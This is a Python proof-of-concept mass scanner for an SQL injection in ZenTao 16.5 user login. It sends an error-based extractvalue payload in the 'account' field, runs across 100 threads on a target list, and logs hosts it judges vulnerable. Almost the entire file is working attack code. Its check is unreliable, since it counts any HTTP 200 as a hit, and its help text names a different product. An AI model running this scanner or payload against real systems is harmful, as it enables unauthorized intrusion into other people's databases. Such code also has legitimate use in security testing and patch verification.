# 禅道 16.5 router.class.php SQL注入漏洞
import re,requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
def banner():
    test = """      ____ _                 ____                                 _            
  / ___| |__   __ _ _ __ |  _ \  __ _  ___     _ __ ___  _   _| |_ ___ _ __ 
 | |   | '_ \ / _` | '_ \| | | |/ _` |/ _ \   | '__/ _ \| | | | __/ _ \ '__|
 | |___| | | | (_| | | | | |_| | (_| | (_) |  | | | (_) | |_| | ||  __/ |   
  \____|_| |_|\__,_|_| |_|____/ \__,_|\___(_) |_|  \___/ \__,_|\__\___|_|   
                                                                            
                                                        version:1.0.8 
                                                        author:guoguo12138                             
"""
    print(test)

def main():
    banner()
    # 处理命令行参数了
    parser = argparse.ArgumentParser(description="用友poc&exp")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()

    if args.url and not args.file:
         poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
                
def poc(target):
    data = 'account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28select+user%28%29%29%2C0x7e%29%29%29%23'
    payload_url = '/user-login.html'
    url = target+payload_url
    try:
        res = requests.post(url=url,data=data)
        if res.status_code == 200:
                print(f"[+该url存在漏洞{target}")
                with open('try002.txt','a',encoding='utf-8') as fp:
                    fp.write(target+"\n")
                    return True
        else:
                print(f"该url不存在漏洞{target}")
                return False
    except Exception as e:
        print(f"该url连接存在问题{target}")
        return False

if __name__ == '__main__':
    main()
